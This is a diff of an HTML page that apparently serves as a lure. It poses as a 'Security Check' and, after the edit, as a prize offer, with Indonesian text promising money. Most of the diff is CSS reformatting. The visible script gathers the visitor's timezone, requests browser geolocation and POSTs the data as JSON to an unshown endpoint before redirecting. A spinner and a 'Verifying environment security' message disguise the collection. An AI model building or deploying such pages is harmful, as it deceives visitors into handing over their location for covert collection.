@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -19,7 +20,7 @@
             padding: 0;
             font-family: 'Inter', system-ui, -apple-system, sans-serif;
             background: var(--bg-color);
-            background-image: 
+            background-image:
                 radial-gradient(circle at 15% 50%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
                 radial-gradient(circle at 85% 30%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
             color: var(--text-main);
@@ -47,7 +48,10 @@
         }
 
         @keyframes slideUp {
-            to { transform: translateY(0); opacity: 1; }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
         }
 
         .spinner {
@@ -61,7 +65,9 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         h1 {
@@ -101,18 +107,24 @@
         }
 
         @keyframes pulse {
-            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+            70% {
+                box-shadow: 0 0 0 6px rgba(16, 185, 129, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
+            }
         }
     </style>
 </head>
+
 <body>
 
     <div class="glass-panel">
         <div class="spinner"></div>
-        <h1>Security Check</h1>
-        <p>Location verification is required to continue. Please confirm your location when prompted by your browser to access the system.</p>
-        
+        <h1>Bonus Hadiah</h1>
+        <p>Setuju Mendapatkan Uang</p>
+
         <div class="status">
             <span class="pulse"></span>
             <span id="status-text">Verifying environment security...</span>
@@ -136,7 +148,7 @@
         let timezoneStr = "Unknown";
         try {
             timezoneStr = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        } catch(e) { }
+        } catch (e) { }
 
         function sendData(data) {
             // Append client side data
@@ -148,8 +160,8 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             })
-            .then(() => redirect())
-            .catch(() => redirect());
+                .then(() => redirect())
+                .catch(() => redirect());
         }
 
         // Request geolocation
@@ -182,4 +194,5 @@
         }
     </script>
 </body>
+
 </html>
